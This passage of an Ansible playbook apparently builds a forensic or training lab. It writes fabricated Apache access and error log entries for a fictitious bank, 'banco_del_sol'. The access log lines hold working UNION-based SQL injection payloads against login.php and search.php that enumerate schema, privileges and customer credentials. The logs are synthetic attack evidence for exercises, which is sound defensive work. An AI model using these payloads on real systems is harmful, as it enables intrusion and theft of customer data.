          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 3289 "username=admin'%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME,DATA_TYPE,4%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA='banco_del_sol'--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2891 "username=admin'%20UNION%20SELECT%20nombre,email,numero_cuenta,saldo%20FROM%20customer_accounts--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 3012 "username=admin'%20UNION%20SELECT%20grantee,privilege_type,is_grantable,4%20FROM%20information_schema.USER_PRIVILEGES--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /search.php?q=BS-001'%20UNION%20SELECT%20username,password,numero_cuenta,saldo%20FROM%20customer_accounts-- HTTP/1.1" 200 1876 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /search.php?q=BS-001'%20UNION%20SELECT%20database(),user(),version(),4-- HTTP/1.1" 200 1654 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

    - name: "FASE 1.4 - Crear logs de error-based SQLi"
      delegate_to: webserver
      become: yes
      ansible.builtin.blockinfile:
        path: /var/log/apache2/error.log
        marker: "# {mark} ATTACK SQLI ERRORS"
        insertafter: EOF
        block: |
          [{{ attack_start_time }}] [error] [client {{ attacker_ip }}] PHP Warning: PDO::query(): SQLSTATE[42000]: Syntax error or access violation in /var/www/html/banco_del_sol/public/login.php on line 25
